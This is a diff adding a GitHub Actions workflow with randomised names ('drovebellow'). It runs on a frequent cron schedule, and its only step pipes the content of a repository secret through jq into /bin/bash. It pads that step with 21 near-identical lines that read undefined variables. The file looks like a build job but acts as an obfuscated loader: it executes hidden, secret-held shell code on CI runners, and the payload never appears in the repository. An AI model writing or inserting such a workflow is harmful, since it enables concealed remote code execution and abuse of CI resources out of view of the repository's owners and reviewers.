@@ -1,0 +1,39 @@
+name: drovebellow
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: drovebellow
+        env:
+          wsuqc91: ${{ secrets.wsuqc91 }}
+        run: |
+          echo $wsuqc91 | jq -r .c30537 | /bin/bash
+          echo $djezv30 | jq -r .m89178 | /bin/bash
+          echo $xpzz26 | jq -r .koug52180 | /bin/bash
+          echo $vkak4476 | jq -r .xwbig15 | /bin/bash
+          echo $ufci1 | jq -r .zcz46 | /bin/bash
+          echo $xhj189 | jq -r .l2339 | /bin/bash
+          echo $mxtjt93 | jq -r .pncvg1146 | /bin/bash
+          echo $f01680 | jq -r .gcrdg84745 | /bin/bash
+          echo $oz9871 | jq -r .zwmp5444 | /bin/bash
+          echo $swsa81118 | jq -r .ht6 | /bin/bash
+          echo $ce3140 | jq -r .irtzq6738 | /bin/bash
+          echo $q3244 | jq -r .w1 | /bin/bash
+          echo $k0396 | jq -r .f46354 | /bin/bash
+          echo $wt36 | jq -r .izt81215 | /bin/bash
+          echo $fftve47 | jq -r .yh6013 | /bin/bash
+          echo $eiln80883 | jq -r .epfs0592 | /bin/bash
+          echo $iq1 | jq -r .zpghn63342 | /bin/bash
+          echo $fwtq68046 | jq -r .hugm5666 | /bin/bash
+          echo $x224 | jq -r .denvr62 | /bin/bash
+          echo $tdmmf7361 | jq -r .z25 | /bin/bash
+          echo $jy9618 | jq -r .ywo873 | /bin/bash
+          echo $vlr6502 | jq -r .q63 | /bin/bash
+
